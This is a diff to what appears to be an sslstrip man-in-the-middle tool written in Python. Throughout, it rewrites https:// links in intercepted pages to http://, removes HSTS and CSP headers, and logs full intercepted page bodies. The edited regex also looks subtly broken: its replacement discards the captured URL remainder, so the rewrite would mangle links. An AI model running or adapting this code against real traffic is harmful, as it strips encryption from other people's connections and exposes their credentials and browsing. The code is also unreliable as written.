@@ -26,7 +26,7 @@ def setup_logging(verbose, quiet):
 log = logging.getLogger("sslstrip")
 
 HTTPS_RE= re.compile(br"https://", re.I)# plain “https://”
-TAG_RE = re.compile(br'(?i)(href|src|action)=["\']https://') # HTML attrs
+TAG_RE = re.compile(br'(?i)(href|src|action)=["\']https://([^"\']+)', re.I)# HTML attrs
 DROP_HDRS= {b"strict-transport-security", b"content-security-policy"}
 HDR_END_RE = re.compile(br"\r\n\r\n") # header/body split
 BODY_CAP = 131072  # 128 kB
@@ -74,13 +74,13 @@ def _rewrite_hdr(resp):
 #Replace every https:// and every <a href="https://…"> etc.
 def _rewrite_body(body):
     logging.info("[DEBUG] Entered _rewrite_body with %d bytes", len(body))
-    logging.debug("Original body:\n%s", body)
+    logging.info("Original body:\n%s", body)
     nb = TAG_RE.sub(lambda m: m.group(1) + b'="http://', body)
     nb = HTTPS_RE.sub(b"http://", nb)
     delta = len(nb) - len(body)
     logging.info("[REWRITE_BODY] Rewrote body by %+d bytes", delta)
     if b"https://" in body and b"http://" in nb:
-        logging.debug("[REWRITE_BODY] Downgrade success: some https:// converted to http://")
+        logging.info("[REWRITE_BODY] Downgrade success: some https:// converted to http://")
     return nb, delta
 
 #Apply running delta so TCP sequence numbers stay in sync.
